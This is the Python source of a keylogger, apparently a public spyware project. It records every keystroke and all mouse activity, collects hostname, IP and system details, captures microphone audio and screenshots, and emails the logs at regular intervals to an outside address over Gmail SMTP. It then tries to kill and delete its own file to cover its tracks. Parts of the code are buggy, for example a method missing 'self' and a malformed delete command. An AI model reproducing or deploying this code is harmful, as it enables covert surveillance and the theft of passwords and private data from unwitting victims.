try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener, Key
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "YOUR_USERNAME"
    EMAIL_PASSWORD = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = f"Mouse moved to {x} {y}"
            logging.info(current_move)
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = f"Mouse clicked at {x} {y}"
            logging.info(current_click)
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = f"Mouse scrolled at {x} {y}"
            logging.info(current_scroll)
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == Key.space:
                    current_key = " "
                elif key == Key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail(email, password, message):
            sender = f"Private Person <{email}>"
            receiver = "A Test User <to@example.com>"

            m = f"""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}

            Keylogger by aydinnyunus\n"""

            m += message
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(email, password)
                server.sendmail(sender, receiver, m)

        def report(self):
            try:
                self.send_mail(self.email, self.password, "\n\n" + self.log)
                self.log = ""
            except Exception as e:
                print("Error:", e)

            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            mouse_listener = Listener(
                on_click=self.on_click,
                on_move=self.on_move,
                on_scroll=self.on_scroll
            )

            keyboard_listener.start()
            mouse_listener.start()

            self.report()

            keyboard_listener.join()
            mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()


